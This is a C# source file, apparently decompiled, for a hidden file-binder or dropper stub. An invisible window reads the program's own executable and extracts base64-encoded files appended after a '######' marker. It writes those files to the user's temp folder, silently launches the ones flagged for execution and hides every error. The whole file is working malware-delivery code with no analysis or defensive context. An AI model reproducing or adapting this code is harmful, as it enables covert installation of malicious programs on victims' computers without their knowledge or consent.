using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private List<int> orders;

	private List<string> filenames;

	private List<bool> executes;

	public Form1()
	{
		((Form)this).add_Shown((EventHandler)gloa);
		orders = new List<int>();
		filenames = new List<string>();
		executes = new List<bool>();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void gloa(object sender, EventArgs e)
	{
		try
		{
			string text = Module1.files();
			string[] array = text.Split(new char[1] { '¥' });
			try
			{
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					try
					{
						string[] array3 = text2.Split(new char[1] { '¦' });
						orders.Add(int.Parse(array3[0]));
						filenames.Add(array3[1]);
						executes.Add(bool.Parse(array3[2]));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
			string text3 = sssa();
			FileSystem.FileGet(1, ref text3, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array4 = Strings.Split(text3, "######", -1, (CompareMethod)0);
			string text4 = array4[1];
			string[] array5 = text4.Split(new char[1] { '$' });
			int num = 0;
			string[] array6 = array5;
			foreach (string s in array6)
			{
				try
				{
					byte[] array7 = Convert.FromBase64String(s);
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\" + filenames[num], array7, false);
					num = checked(num + 1);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				Delay(1);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (int order in orders)
			{
				if (executes[order])
				{
					try
					{
						Process.Start(Path.GetTempPath() + filenames[order]);
						Delay(1);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		((Form)this).Close();
	}

	private void Delay(int DelayInSeconds)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(DelayInSeconds);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private string sssa()
	{
		return Strings.Space(checked((int)FileSystem.LOF(1)));
	}
}
